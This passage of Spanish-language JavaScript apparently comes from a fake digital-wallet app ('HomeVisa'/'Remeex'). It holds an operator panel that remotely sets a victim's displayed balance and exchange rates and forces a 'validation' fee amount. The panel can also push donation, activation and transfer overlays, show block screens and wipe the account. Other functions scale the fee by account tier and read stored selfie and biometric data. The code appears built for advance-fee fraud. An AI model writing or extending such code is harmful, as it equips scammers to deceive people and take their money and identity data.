    if (blockMessageInput && (!blockMessageInput.value || !blockMessageInput.value.trim())) {
      const currentType = blockTypeSelect && blockTypeSelect.value ? blockTypeSelect.value : (blockState && blockState.type) || 'general';
      const preset = BLOCK_PRESETS[currentType] || BLOCK_PRESETS.general;
      blockMessageInput.placeholder = preset.message;
    }

    const balanceFields = [
      { id: 'remote-balance-bs', value: balance && Number.isFinite(balance.bs) ? balance.bs : null, currency: 'ves' },
      { id: 'remote-balance-usd', value: balance && Number.isFinite(balance.usd) ? balance.usd : null, currency: 'usd' },
      { id: 'remote-balance-eur', value: balance && Number.isFinite(balance.eur) ? balance.eur : null, currency: 'eur' },
      { id: 'remote-balance-usdt', value: balance && Number.isFinite(balance.usdt) ? balance.usdt : null, currency: null }
    ];
    balanceFields.forEach((field) => {
      const input = document.getElementById(field.id);
      if (!input || (input.value && input.value.trim())) return;
      if (field.currency === null) {
        input.placeholder = Number.isFinite(field.value)
          ? formatNumber(field.value, { minimumFractionDigits: 2, maximumFractionDigits: 2 })
          : '0.00';
      } else {
        input.placeholder = Number.isFinite(field.value)
          ? formatCurrency(field.value, field.currency)
          : field.currency === 'ves'
            ? '0,00'
            : '0.00';
      }
    });

    const rateSelect = document.getElementById('remote-rate-key');
    if (rateSelect && rate && rate.key) {
      rateSelect.value = rate.key;
    }
    const rateValueInput = document.getElementById('remote-rate-value');
    if (rateValueInput && (!rateValueInput.value || !rateValueInput.value.trim())) {
      rateValueInput.placeholder = Number.isFinite(rate?.value)
        ? formatNumber(rate.value, { minimumFractionDigits: 2, maximumFractionDigits: 4 })
        : '37,50';
    }
    const rateEurInput = document.getElementById('remote-rate-eur');
    if (rateEurInput && (!rateEurInput.value || !rateEurInput.value.trim())) {
      rateEurInput.placeholder = Number.isFinite(rate?.usdToEur)
        ? formatNumber(rate.usdToEur, { minimumFractionDigits: 2, maximumFractionDigits: 4 })
        : '0.93';
    }

    const validationInput = document.getElementById('remote-validation-amount');
    if (validationInput && (!validationInput.value || !validationInput.value.trim())) {
      validationInput.placeholder = Number.isFinite(validationAmount)
        ? formatNumber(validationAmount, { minimumFractionDigits: 2, maximumFractionDigits: 2 })
        : '25.00';
    }

    if (logContainer) {
      logContainer.innerHTML = '';
      const recent = commands.slice(-6).reverse();
      if (recent.length === 0) {
        const empty = document.createElement('div');
        empty.className = 'remote-log-empty';
        empty.textContent = 'No hay acciones registradas recientemente.';
        logContainer.appendChild(empty);
      } else {
        recent.forEach((cmd) => {
          const item = document.createElement('div');
          item.className = 'remote-log-item';
          const label = document.createElement('span');
          label.className = 'remote-log-label';
          label.textContent = REMOTE_ACTION_LABELS[cmd.type] || cmd.type;
          const time = document.createElement('span');
          time.className = 'remote-log-time';
          time.textContent = formatTimestamp(cmd.createdAt || cmd.timestamp || Date.now());
          item.appendChild(label);
          item.appendChild(time);
          logContainer.appendChild(item);
        });
      }
    }
  }

  function refreshRemoteControlPanel() {
    renderRemoteControlPanel({
      balance: loadBalance(),
      rate: getRateInfo(),
      commands: loadRemoteCommands(),
      processed: loadProcessedCommandIds(),
      blockState: loadRemoteBlockState(),
      validationAmount: toNumber(localStorage.getItem('forcedValidationAmountUsd'))
    });
  }

  function populateBalanceInputs() {
    const balance = loadBalance();
    if (!balance || typeof balance !== 'object') {
      showRemoteFeedback('No se encontró un saldo almacenado en este dispositivo.', 'error');
      return;
    }
    const bsInput = document.getElementById('remote-balance-bs');
    const usdInput = document.getElementById('remote-balance-usd');
    const eurInput = document.getElementById('remote-balance-eur');
    const usdtInput = document.getElementById('remote-balance-usdt');
    if (bsInput) bsInput.value = Number.isFinite(balance.bs) ? formatNumber(balance.bs) : '';
    if (usdInput) usdInput.value = Number.isFinite(balance.usd) ? formatNumber(balance.usd) : '';
    if (eurInput) eurInput.value = Number.isFinite(balance.eur) ? formatNumber(balance.eur) : '';
    if (usdtInput) usdtInput.value = Number.isFinite(balance.usdt) ? formatNumber(balance.usdt, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : '';
    showRemoteFeedback('Saldo actual cargado en el panel.', 'success');
  }

  function handleRemoteBalanceSubmit(event) {
    event.preventDefault();
    const payload = {};
    const bsInput = document.getElementById('remote-balance-bs');
    const usdInput = document.getElementById('remote-balance-usd');
    const eurInput = document.getElementById('remote-balance-eur');
    const usdtInput = document.getElementById('remote-balance-usdt');

    const bsValue = toNumber(bsInput ? bsInput.value : null);
    const usdValue = toNumber(usdInput ? usdInput.value : null);
    const eurValue = toNumber(eurInput ? eurInput.value : null);
    const usdtValue = toNumber(usdtInput ? usdtInput.value : null);

    if (Number.isFinite(bsValue)) payload.bs = bsValue;
    if (Number.isFinite(usdValue)) payload.usd = usdValue;
    if (Number.isFinite(eurValue)) payload.eur = eurValue;
    if (Number.isFinite(usdtValue)) payload.usdt = usdtValue;

    if (!Object.keys(payload).length) {
      showRemoteFeedback('Introduce al menos un monto válido para actualizar el saldo.', 'error');
      return;
    }

    payload.timestamp = new Date().toISOString();
    enqueueRemoteCommand('update-balance', payload, { description: 'Actualización manual desde Mi Información' });
    showRemoteFeedback('Actualización de saldo enviada a HomeVisa.', 'success');
    event.target.reset();
    refreshRemoteControlPanel();
  }

  function handleRemoteRateSubmit(event) {
    event.preventDefault();
    const select = document.getElementById('remote-rate-key');
    const valueInput = document.getElementById('remote-rate-value');
    const eurInput = document.getElementById('remote-rate-eur');
    const key = select && select.value ? select.value : 'personalizado';
    const value = toNumber(valueInput ? valueInput.value : null);
    const usdToEur = toNumber(eurInput ? eurInput.value : null);
    const payload = { key, label: RATE_LABELS[key] || key };

    if (Number.isFinite(value)) {
      payload.value = value;
    }
    if (Number.isFinite(usdToEur)) {
      payload.usdToEur = usdToEur;
    }

    enqueueRemoteCommand('update-rate', payload, { type: key });
    showRemoteFeedback('Tasa enviada a HomeVisa.', 'success');
    event.target.reset();
    refreshRemoteControlPanel();
  }

  function handleRemoteValidationSubmit(event) {
    event.preventDefault();
    const input = document.getElementById('remote-validation-amount');
    if (!input) return;
    const raw = input.value.trim();
    if (!raw) {
      enqueueRemoteCommand('set-validation-amount', { amount: null }, { action: 'clear' });
      showRemoteFeedback('Se solicitó restablecer el monto de validación.', 'success');
      return;
    }
    const amount = toNumber(raw);
    if (!Number.isFinite(amount) || amount <= 0) {
      showRemoteFeedback('Introduce un monto de validación válido en USD.', 'error');
      return;
    }
    enqueueRemoteCommand('set-validation-amount', { amount }, { action: 'set' });
    showRemoteFeedback('Monto de validación enviado a HomeVisa.', 'success');
    event.target.reset();
    refreshRemoteControlPanel();
  }

  function handleRemoteOverlay(template) {
    const overrides = collectOverlayOverrides();
    const payload = buildOverlayPayload(template, overrides);
    enqueueRemoteCommand('show-overlay', payload, { template });
    showRemoteFeedback('Overlay enviado a HomeVisa.', 'success');
  }

  function handleRemoteOverlayHide() {
    enqueueRemoteCommand('hide-overlay', {}, { template: 'hide' });
    showRemoteFeedback('Se solicitó ocultar el overlay remoto.', 'success');
  }

  function handleRemoteBlockActivation() {
    const select = document.getElementById('remote-block-type');
    const textarea = document.getElementById('remote-block-message');
    const type = select && select.value ? select.value : 'general';
    const preset = BLOCK_PRESETS[type] || BLOCK_PRESETS.general;
    const message = textarea && textarea.value.trim() ? textarea.value.trim() : preset.message;
    const payload = {
      active: true,
      type,
      message,
      title: preset.label,
      accent: preset.accent
    };
    enqueueRemoteCommand('set-block', payload, { type });
    showRemoteFeedback('Bloqueo activado en HomeVisa.', 'success');
  }

  function handleRemoteBlockDeactivation() {
    enqueueRemoteCommand('set-block', { active: false }, { type: 'clear' });
    showRemoteFeedback('Se solicitó eliminar el bloqueo remoto.', 'success');
  }

  function handleRemoteAccountDeletion() {
    const confirmed = typeof window.confirm === 'function'
      ? window.confirm('¿Eliminar todos los datos locales almacenados en HomeVisa? Esta acción se reflejará en la otra pestaña.')
      : true;
    if (!confirmed) return;
    enqueueRemoteCommand('wipe-account', { keys: ACCOUNT_STORAGE_KEYS.slice() }, { action: 'wipe' });
    showRemoteFeedback('Se solicitó eliminar la cuenta local en HomeVisa.', 'success');
  }

  function initRemoteControls() {
    const balanceForm = document.getElementById('remote-balance-form');
    if (balanceForm) {
      balanceForm.addEventListener('submit', handleRemoteBalanceSubmit);
    }
    const balanceSync = document.getElementById('remote-balance-sync');
    if (balanceSync) {
      balanceSync.addEventListener('click', function (event) {
        event.preventDefault();
        populateBalanceInputs();
      });
    }

    const rateForm = document.getElementById('remote-rate-form');
    if (rateForm) {
      rateForm.addEventListener('submit', handleRemoteRateSubmit);
    }

    const validationForm = document.getElementById('remote-validation-form');
    if (validationForm) {
      validationForm.addEventListener('submit', handleRemoteValidationSubmit);
    }

    const validationClear = document.getElementById('remote-validation-clear');
    if (validationClear) {
      validationClear.addEventListener('click', function (event) {
        event.preventDefault();
        enqueueRemoteCommand('set-validation-amount', { amount: null }, { action: 'clear' });
        showRemoteFeedback('Se solicitó restablecer el monto de validación.', 'success');
        const input = document.getElementById('remote-validation-amount');
        if (input) {
          input.value = '';
        }
        refreshRemoteControlPanel();
      });
    }

    const overlayDonation = document.getElementById('remote-overlay-donation');
    if (overlayDonation) {
      overlayDonation.addEventListener('click', function (event) {
        event.preventDefault();
        handleRemoteOverlay('donation');
      });
    }

    const overlayActivation = document.getElementById('remote-overlay-activation');
    if (overlayActivation) {
      overlayActivation.addEventListener('click', function (event) {
        event.preventDefault();
        handleRemoteOverlay('activation');
      });
    }

    const overlayTransfer = document.getElementById('remote-overlay-transfer');
    if (overlayTransfer) {
      overlayTransfer.addEventListener('click', function (event) {
        event.preventDefault();
        handleRemoteOverlay('transfer');
      });
    }

    const overlayHide = document.getElementById('remote-overlay-hide');
    if (overlayHide) {
      overlayHide.addEventListener('click', function (event) {
        event.preventDefault();
        handleRemoteOverlayHide();
      });
    }

    const blockActivate = document.getElementById('remote-block-activate');
    if (blockActivate) {
      blockActivate.addEventListener('click', function (event) {
        event.preventDefault();
        handleRemoteBlockActivation();
      });
    }

    const blockDeactivate = document.getElementById('remote-block-deactivate');
    if (blockDeactivate) {
      blockDeactivate.addEventListener('click', function (event) {
        event.preventDefault();
        handleRemoteBlockDeactivation();
      });
    }

    const deleteAccountBtn = document.getElementById('remote-delete-account');
    if (deleteAccountBtn) {
      deleteAccountBtn.addEventListener('click', function (event) {
        event.preventDefault();
        handleRemoteAccountDeletion();
      });
    }

    const blockTypeSelect = document.getElementById('remote-block-type');
    if (blockTypeSelect) {
      blockTypeSelect.addEventListener('change', function () {
        updateBlockMessagePlaceholder();
      });
      updateBlockMessagePlaceholder();
    }

    refreshRemoteControlPanel();
  }

  function parseTimestampValue(value) {
    if (value === null || value === undefined) return null;
    if (value instanceof Date && !Number.isNaN(value.getTime())) {
      return value.getTime();
    }
    if (typeof value === 'number') {
      if (!Number.isFinite(value)) return null;
      if (value > 1e12) return value;
      if (value > 1e11) return value;
      if (value > 1e9) return value * 1000;
      if (value > 1e6) return value * 1000;
      return value * 1000;
    }
    if (typeof value === 'string') {
      const trimmed = value.trim();
      if (!trimmed) return null;
      const numeric = Number(trimmed);
      if (Number.isFinite(numeric)) {
        return parseTimestampValue(numeric);
      }
      const parsed = Date.parse(trimmed);
      if (!Number.isNaN(parsed)) {
        return parsed;
      }
    }
    return null;
  }

  function formatTimestamp(timestamp) {
    if (!timestamp) return '--';
    const date = new Date(timestamp);
    if (Number.isNaN(date.getTime())) return '--';
    const datePart = date.toLocaleDateString('es-VE', { day: '2-digit', month: '2-digit', year: '2-digit' });
    const timePart = date.toLocaleTimeString('es-VE', { hour: '2-digit', minute: '2-digit' });
    return `${datePart} ${timePart}`;
  }

  function formatDateMeta(value) {
    if (value === null || value === undefined || value === '') return '';
    const formatted = formatTimestamp(value);
    if (formatted !== '--') return formatted;
    if (typeof value === 'string') return value;
    if (Number.isFinite(value)) return String(value);
    return '';
  }

  function formatDateDetail(value) {
    if (value === null || value === undefined || value === '') return '—';
    const formatted = formatDateMeta(value);
    if (!formatted) {
      return typeof value === 'string' ? value : String(value);
    }
    if (typeof value === 'string' && formatted !== value) {
      return `${value} (${formatted})`;
    }
    if (Number.isFinite(value) && formatted !== String(value)) {
      return `${value} (${formatted})`;
    }
    return formatted;
  }

  function resolveTimestamp(transaction) {
    if (!transaction || typeof transaction !== 'object') return null;
    const candidates = [
      transaction.timestamp,
      transaction.date,
      transaction.createdAt,
      transaction.updatedAt,
      transaction.completedAt,
      transaction.processedAt,
      transaction.time
    ];

    for (const candidate of candidates) {
      const parsed = parseTimestampValue(candidate);
      if (parsed !== null) {
        return parsed;
      }
    }

    return null;
  }

  function resolveAmount(transaction) {
    if (!transaction || typeof transaction !== 'object') return { amount: null, currency: 'usd' };
    const candidates = [
      { amount: transaction.displayAmount, currency: transaction.displayCurrency },
      { amount: transaction.amount, currency: transaction.currency || transaction.currencyCode || transaction.currency_type },
      { amount: transaction.total, currency: transaction.currency || transaction.currencyCode },
      { amount: transaction.amountUsd, currency: 'usd' },
      { amount: transaction.amountUSD, currency: 'usd' },
      { amount: transaction.amountBs, currency: 'bs' },
      { amount: transaction.amountVES, currency: 'bs' },
      { amount: transaction.amountEur, currency: 'eur' }
    ];

    for (const entry of candidates) {
      const value = toNumber(entry.amount);
      if (value !== null) {
        let currency = entry.currency;
        if (!currency) {
          if (entry === candidates[5] || entry === candidates[6]) currency = 'bs';
          else if (entry === candidates[7]) currency = 'eur';
          else currency = 'usd';
        }
        return { amount: value, currency };
      }
    }

    return { amount: null, currency: 'usd' };
  }

  function resolveStatus(transaction) {
    const status = (transaction?.status || transaction?.state || transaction?.current_status || '').toString().trim();
    if (!status) return { label: 'Sin estado', css: '' };
    const normalized = status.toLowerCase();
    return {
      label: status,
      css: STATUS_CLASS[normalized] || ''
    };
  }

  function resolveExchangeRates(rateInfo, sessionRate) {
    const usdToBsCandidates = [
      rateInfo && Number.isFinite(rateInfo.value) ? rateInfo.value : null,
      sessionRate && sessionRate.USD_TO_BS,
      sessionRate && sessionRate.usdToBs,
      sessionRate && sessionRate.usd_bs,
      sessionRate && sessionRate.usdToBsRate
    ];
    const usdToEurCandidates = [
      rateInfo && Number.isFinite(rateInfo.usdToEur) ? rateInfo.usdToEur : null,
      sessionRate && sessionRate.USD_TO_EUR,
      sessionRate && sessionRate.usdToEur,
      sessionRate && sessionRate.usd_eur
    ];

    let usdToBs = firstNumber(...usdToBsCandidates);
    let usdToEur = firstNumber(...usdToEurCandidates);

    if (!Number.isFinite(usdToEur) && sessionRate) {
      const eurToUsd = firstNumber(sessionRate.EUR_TO_USD, sessionRate.eurToUsd, sessionRate.eur_usd);
      if (Number.isFinite(eurToUsd) && eurToUsd > 0) {
        usdToEur = 1 / eurToUsd;
      }
    }

    return {
      usdToBs: Number.isFinite(usdToBs) && usdToBs > 0 ? usdToBs : null,
      usdToEur: Number.isFinite(usdToEur) && usdToEur > 0 ? usdToEur : null
    };
  }

  function loadBalanceHistoryRecords() {
    const records = [];
    const storages = [localStorage, sessionStorage];
    BALANCE_HISTORY_KEYS.forEach((key) => {
      storages.forEach((storage) => {
        const raw = safeGetFromStorage(storage, key);
        if (!raw) return;
        const parsed = safeJSONParse(raw);
        if (!parsed) return;
        if (Array.isArray(parsed)) {
          parsed.forEach((entry) => records.push(entry));
          return;
        }
        if (Array.isArray(parsed.history)) {
          parsed.history.forEach((entry) => records.push(entry));
        }
        if (Array.isArray(parsed.entries)) {
          parsed.entries.forEach((entry) => records.push(entry));
        }
        if (Array.isArray(parsed.records)) {
          parsed.records.forEach((entry) => records.push(entry));
        }
        if (parsed.timeline && Array.isArray(parsed.timeline)) {
          parsed.timeline.forEach((entry) => records.push(entry));
        }
        if (typeof parsed === 'object') {
          Object.keys(parsed).forEach((nestedKey) => {
            const value = parsed[nestedKey];
            if (Array.isArray(value)) {
              value.forEach((entry) => records.push(entry));
            } else if (value && typeof value === 'object') {
              records.push(Object.assign({ sourceKey: nestedKey }, value));
            }
          });
        }
      });
    });
    return records;
  }

  function normalizeHistoryRecords(records, rates) {
    if (!Array.isArray(records)) return [];
    const normalized = [];
    records.forEach((record) => {
      if (!record || typeof record !== 'object') return;
      const timestampMs = parseTimestampValue(
        record.timestamp ||
          record.date ||
          record.createdAt ||
          record.updatedAt ||
          record.recordedAt ||
          record.time
      );
      let balanceUsd = firstNumber(
        record.balanceUsd,
        record.balanceUSD,
        record.balance_usd,
        record.usd,
        record.usdBalance,
        record.totalUsd,
        record.total_usd,
        record.amountUsd,
        record.usd_amount,
        record.balance && record.balance.usd
      );
      let balanceBs = firstNumber(
        record.balanceBs,
        record.balance_bs,
        record.bs,
        record.bsBalance,
        record.amountBs,
        record.balance && record.balance.bs
      );
      let balanceEur = firstNumber(
        record.balanceEur,
        record.balance_eur,
        record.eur,
        record.amountEur,
        record.balance && record.balance.eur
      );
      let deltaUsd = firstNumber(
        record.deltaUsd,
        record.changeUsd,
        record.delta_usd,
        record.change_usd,
        record.delta,
        record.change && record.change.usd,
        record.variationUsd
      );

      if (!Number.isFinite(balanceUsd)) {
        if (Number.isFinite(balanceBs) && Number.isFinite(rates.usdToBs) && rates.usdToBs > 0) {
          balanceUsd = balanceBs / rates.usdToBs;
        } else if (Number.isFinite(balanceEur) && Number.isFinite(rates.usdToEur) && rates.usdToEur > 0) {
          balanceUsd = balanceEur / rates.usdToEur;
        }
      }

      if (!Number.isFinite(balanceBs) && Number.isFinite(balanceUsd) && Number.isFinite(rates.usdToBs)) {
        balanceBs = balanceUsd * rates.usdToBs;
      }

      if (!Number.isFinite(balanceEur) && Number.isFinite(balanceUsd) && Number.isFinite(rates.usdToEur)) {
        balanceEur = balanceUsd * rates.usdToEur;
      }

      if (!Number.isFinite(balanceUsd)) return;

      normalized.push({
        timestampMs,
        balanceUsd,
        balanceBs: Number.isFinite(balanceBs) ? balanceBs : null,
        balanceEur: Number.isFinite(balanceEur) ? balanceEur : null,
        deltaUsd: Number.isFinite(deltaUsd) ? deltaUsd : null,
        note:
          record.note ||
          record.description ||
          record.label ||
          record.reason ||
          record.event ||
          record.status ||
          null,
        source: record.source || record.origin || record.type || record.kind || record.sourceKey || 'Registro',
        raw: record
      });
    });
    return normalized;
  }

  function inferTransactionDirection(transaction, amount) {
    if (!transaction || typeof transaction !== 'object') return 0;
    const status = (transaction.status || transaction.state || '').toString().toLowerCase();
    if (['rejected', 'cancelled', 'canceled', 'failed'].includes(status)) return 0;

    if (Number.isFinite(amount) && amount < 0) return -1;

    const directionField = (transaction.direction || transaction.flow || '').toString().toLowerCase();
    if (['out', 'outbound', 'debit'].includes(directionField)) return -1;
    if (['in', 'inbound', 'credit'].includes(directionField)) return 1;

    const type = (transaction.type || '').toString().toLowerCase();
    const description = (transaction.description || transaction.title || transaction.concept || '').toString().toLowerCase();
    const category = (transaction.category || transaction.kind || '').toString().toLowerCase();
    const combined = `${type} ${description} ${category}`;

    const positiveKeywords = [
      'deposit',
      'recarga',
      'recharge',
      'abono',
      'credit',
      'ingreso',
      'entrada',
      'transfer in',
      'transferencia recibida',
      'bono',
      'cashback',
      'refund',
      'reembolso',
      'donación recibida',
      'premio'
    ];
    const negativeKeywords = [
      'withdraw',
      'withdrawal',
      'retiro',
      'transfer out',
      'transferencia',
      'envio',
      'envío',
      'pago',
      'payment',
      'compra',
      'debit',
      'cobro',
      'salida',
      'donación',
      'comisión',
      'fee'
    ];

    if (positiveKeywords.some((keyword) => combined.includes(keyword))) return 1;
    if (negativeKeywords.some((keyword) => combined.includes(keyword))) return -1;

    return 1;
  }

  function computeTransactionDeltaUsd(transaction, rates) {
    if (!transaction || typeof transaction !== 'object') return null;
    const amountInfo = resolveAmount(transaction);
    if (!Number.isFinite(amountInfo.amount)) return null;

    const direction = inferTransactionDirection(transaction, amountInfo.amount);
    if (direction === 0) return 0;

    const currency = (amountInfo.currency || 'usd').toString().toLowerCase();
    let amountUsd;

    if (currency === 'usd') {
      amountUsd = amountInfo.amount;
    } else if (currency === 'bs' || currency === 'ves' || currency === 'vef') {
      const rate = firstNumber(
        transaction.rate,
        transaction.rateUsd,
        transaction.rateUSD,
        transaction.exchangeRate,
        transaction.exchange_rate,
        transaction.usdToBs,
        transaction.usd_bs,
        transaction.fxRate,
        transaction.bsPerUsd,
        transaction.rateBs,
        transaction.bolivarRate,
        rates.usdToBs
      );
      if (!Number.isFinite(rate) || rate <= 0) return null;
      amountUsd = amountInfo.amount / rate;
    } else if (currency === 'eur') {
      let usdToEur = firstNumber(
        transaction.usdToEur,
        transaction.rateUsdToEur,
        transaction.exchangeRate,
        transaction.exchange_rate,
        transaction.eurRate,
        transaction.fxRate,
        rates.usdToEur
      );
      if (!Number.isFinite(usdToEur) || usdToEur <= 0) {
        const eurToUsd = firstNumber(
          transaction.eurToUsd,
          transaction.rateEurToUsd,
          transaction.exchangeRateEurToUsd,
          transaction.fx
        );
        if (Number.isFinite(eurToUsd) && eurToUsd > 0) {
          usdToEur = 1 / eurToUsd;
        }
      }
      if (!Number.isFinite(usdToEur) || usdToEur <= 0) return null;
      amountUsd = amountInfo.amount / usdToEur;
    } else {
      amountUsd = amountInfo.amount;
    }

    if (!Number.isFinite(amountUsd)) return null;

    if (amountUsd < 0) return amountUsd;

    return direction * amountUsd;
  }

  function deriveBalanceHistoryFromTransactions(balance, transactions, rates) {
    const derived = [];
    if (!Array.isArray(transactions) || !transactions.length) return derived;
    const currentUsd = toNumber(balance?.usd);
    if (!Number.isFinite(currentUsd)) return derived;

    const entries = transactions
      .map((transaction) => {
        const timestampMs = resolveTimestamp(transaction);
        const deltaUsd = computeTransactionDeltaUsd(transaction, rates);
        return { transaction, timestampMs, deltaUsd };
      })
      .filter((entry) => Number.isFinite(entry.timestampMs) && entry.deltaUsd !== null && entry.deltaUsd !== 0);

    if (!entries.length) return derived;

    entries.sort((a, b) => (b.timestampMs || 0) - (a.timestampMs || 0));

    let runningUsd = currentUsd;
    entries.forEach((entry) => {
      const record = {
        timestampMs: entry.timestampMs,
        balanceUsd: runningUsd,
        balanceBs: Number.isFinite(rates.usdToBs) ? runningUsd * rates.usdToBs : null,
        balanceEur: Number.isFinite(rates.usdToEur) ? runningUsd * rates.usdToEur : null,
        deltaUsd: entry.deltaUsd,
        note:
          entry.transaction.description ||
          entry.transaction.title ||
          entry.transaction.concept ||
          entry.transaction.type ||
          'Transacción',
        source: 'Transacción',
        raw: entry.transaction
      };
      derived.push(record);
      runningUsd -= entry.deltaUsd;
    });

    return derived;
  }

  function buildBalanceHistory(storedRecords, balance, transactions, rates) {
    const stored = normalizeHistoryRecords(storedRecords, rates);
    const derived = deriveBalanceHistoryFromTransactions(balance, transactions, rates);
    const combined = stored.concat(derived);
    if (!combined.length) return [];

    const seen = new Set();
    const deduped = [];
    combined.forEach((entry) => {
      if (!Number.isFinite(entry.balanceUsd)) return;
      const key = `${Number.isFinite(entry.timestampMs) ? entry.timestampMs : 'unknown'}|${Math.round(entry.balanceUsd * 100)}|${entry.source}`;
      if (seen.has(key)) return;
      seen.add(key);
      deduped.push(entry);
    });

    deduped.sort((a, b) => (a.timestampMs || 0) - (b.timestampMs || 0));
    const maxPoints = 200;
    return deduped.length > maxPoints ? deduped.slice(deduped.length - maxPoints) : deduped;
  }

  function computeHistoryStats(history) {
    if (!Array.isArray(history) || !history.length) return null;
    let minEntry = null;
    let maxEntry = null;
    let firstEntry = null;
    let lastEntry = null;
    let sum = 0;
    let count = 0;

    history.forEach((entry) => {
      if (!Number.isFinite(entry.balanceUsd)) return;
      sum += entry.balanceUsd;
      count += 1;
      if (!minEntry || entry.balanceUsd < minEntry.balanceUsd) minEntry = entry;
      if (!maxEntry || entry.balanceUsd > maxEntry.balanceUsd) maxEntry = entry;
      if (!firstEntry || (entry.timestampMs || Infinity) < (firstEntry.timestampMs || Infinity)) firstEntry = entry;
      if (!lastEntry || (entry.timestampMs || -Infinity) > (lastEntry.timestampMs || -Infinity)) lastEntry = entry;
    });

    if (!count) return null;

    const average = sum / count;
    const variation = Number.isFinite(lastEntry.balanceUsd) && Number.isFinite(firstEntry.balanceUsd)
      ? lastEntry.balanceUsd - firstEntry.balanceUsd
      : null;

    return {
      min: minEntry,
      max: maxEntry,
      first: firstEntry,
      last: lastEntry,
      average,
      count,
      variation
    };
  }

  function computeAccountTierFromBalance(balanceUsd) {
    if (!Number.isFinite(balanceUsd)) return 'Estándar';
    if (balanceUsd >= 5001) return 'Uranio Infinite';
    if (balanceUsd >= 2001) return 'Uranio Visa';
    if (balanceUsd >= 1001) return 'Platinum';
    if (balanceUsd >= 501) return 'Bronce';
    return 'Estándar';
  }

  function loadPoints() {
    const raw = safeGetFromStorage(localStorage, 'remeexPoints');
    const data = safeJSONParse(raw);
    const points = toNumber(data && data.points);
    return Number.isFinite(points) ? points : null;
  }

  function resolveValidationAmount(tier) {
    const forced = toNumber(safeGetFromStorage(localStorage, 'forcedValidationAmountUsd'));
    if (Number.isFinite(forced) && forced > 0) {
      return {
        usd: forced,
        base: forced,
        forced: true,
        bcvsurcharge: false,
        discountApplied: false,
        discountValue: 0,
        commission: null,
        selectedRate: safeGetFromStorage(localStorage, 'selectedRate') || ''
      };
    }

    const base = VALIDATION_AMOUNTS_BY_TIER[tier] || VALIDATION_AMOUNTS_BY_TIER['Estándar'];
    let amount = base;
    let bcvsurcharge = false;
    let discountApplied = false;
    let discountValue = 0;
    let commission = toNumber(safeGetFromStorage(localStorage, 'pendingCommission'));
    const selectedRate = (safeGetFromStorage(localStorage, 'selectedRate') || '').trim();

    if (selectedRate === 'bcv') {
      amount += 5;
      bcvsurcharge = true;
    }

    const discountRaw = parseInt(safeGetFromStorage(localStorage, 'validationDiscount') || '0', 10);
    const expiry = parseInt(safeGetFromStorage(localStorage, 'discountExpiry') || '0', 10);
    const used = safeGetFromStorage(localStorage, 'discountUsed') === 'true';
    if (
      discountRaw > 0 &&
      (!expiry || Date.now() < expiry) &&
      !used &&
      selectedRate !== 'bcv'
    ) {
      amount -= discountRaw;
      discountApplied = true;
      discountValue = discountRaw;
    }

    if (!Number.isFinite(commission) || commission <= 0 || commission >= 1) {
      commission = null;
    } else {
      amount *= 1 - commission;
    }

    return {
      usd: Math.max(amount, 0),
      base,
      forced: false,
      bcvsurcharge,
      discountApplied,
      discountValue,
      commission,
      selectedRate
    };
  }

  function resolveAccountInfo(balance, rates) {
    const balanceUsd = toNumber(balance?.usd);
    const balanceBs = toNumber(balance?.bs);
    const balanceEur = toNumber(balance?.eur);
    const storedTierRaw = safeGetFromStorage(localStorage, 'remeexAccountTier');
    const storedTier = typeof storedTierRaw === 'string' ? storedTierRaw.trim() : '';
    const computedTier = computeAccountTierFromBalance(balanceUsd);
    const tier = storedTier || computedTier;
    const validation = resolveValidationAmount(tier);
    const points = loadPoints();

    return {
      tier,
      tierSource: storedTier ? 'Nivel sincronizado' : 'Estimado según saldo',
      balanceUsd,
      balanceBs,
      balanceEur,
      validationUsd: Number.isFinite(validation.usd) ? validation.usd : null,
      validationBs:
        Number.isFinite(validation.usd) && Number.isFinite(rates.usdToBs)
          ? validation.usd * rates.usdToBs
          : null,
      validationEur:
        Number.isFinite(validation.usd) && Number.isFinite(rates.usdToEur)
          ? validation.usd * rates.usdToEur
          : null,
      validation,
      points,
      usdToBs: rates.usdToBs,
      usdToEur: rates.usdToEur
    };
  }

  function resolveAvatarSource(registration, userData, verification, banking, temp, biometric) {
    const candidates = [
      safeGetFromStorage(localStorage, 'remeexProfilePhoto'),
      registration?.profilePhoto,
      userData?.profilePhoto,
      verification?.profilePhoto,
      banking?.profilePhoto,
      temp?.profilePhoto,
      biometric?.selfieImage,
      biometric?.photo,
      biometric?.avatar,
      biometric?.raw?.selfieImage,
      biometric?.raw?.photo,
      biometric?.raw?.avatar
    ];

    for (const candidate of candidates) {
      if (typeof candidate === 'string') {
        const trimmed = candidate.trim();
        if (trimmed) {
          return trimmed;
        }
      }
    }

    return null;
  }

  function resolveBiometricInfo(biometric, biometricSkipped) {
    if (biometricSkipped) {
      return {
        status: 'skipped',
        statusLabel: 'Omitida por el usuario',
        captureDate: null,
        attempts: null,
        score: null,
        successAudioPlayed: false,
        selfieImage: null,
        raw: biometric || null
      };
    }

    if (!biometric || typeof biometric !== 'object') {
      return null;
    }

    const parseNumber = (value) => {
      if (Number.isFinite(value)) return value;
      if (typeof value === 'string' && value.trim()) {
        const parsed = Number.parseFloat(value);
        return Number.isFinite(parsed) ? parsed : null;
      }
      return null;
    };

    const attempts = parseNumber(biometric.attemptNumber ?? biometric.totalAttempts);
    const score = parseNumber(biometric.analysisScore ?? biometric.score ?? biometric.analysis?.score);
    const captureDate =
      biometric.captureDate ||
      biometric.capture_at ||
      biometric.captureTimestamp ||
      biometric.lastUpdatedAt ||
      biometric.metadata?.finalizedAt ||
      null;

    const statusRaw = biometric.status || biometric.analysisSummary?.status;
    let statusLabel = biometric.analysisSummary?.label;
    if (!statusLabel) {
      switch ((statusRaw || '').toLowerCase()) {
        case 'success':
        case 'aprobada':
        case 'completed':
          statusLabel = 'Captura aprobada';
          break;
        case 'pending':
        case 'en_proceso':
          statusLabel = 'En evaluación';
          break;
        case 'retry':
        case 'rejected':
          statusLabel = 'Requiere repetición';
          break;
        default:
          statusLabel = biometric.captured ? 'Captura registrada' : 'Sin estado disponible';
      }
    }

    let analysisSummary = null;
    if (biometric.analysisSummary && typeof biometric.analysisSummary === 'object') {
      analysisSummary = Object.assign({}, biometric.analysisSummary);
      if (analysisSummary.totalDurationMs !== undefined) {
        const duration = Number.parseFloat(analysisSummary.totalDurationMs);
        if (Number.isFinite(duration)) {
          analysisSummary.totalDurationMs = duration;
        }
      }
      if (analysisSummary.attempts !== undefined) {
        const parsedAttempts = Number.parseInt(analysisSummary.attempts, 10);
        if (Number.isFinite(parsedAttempts)) {
          analysisSummary.attempts = parsedAttempts;
        }
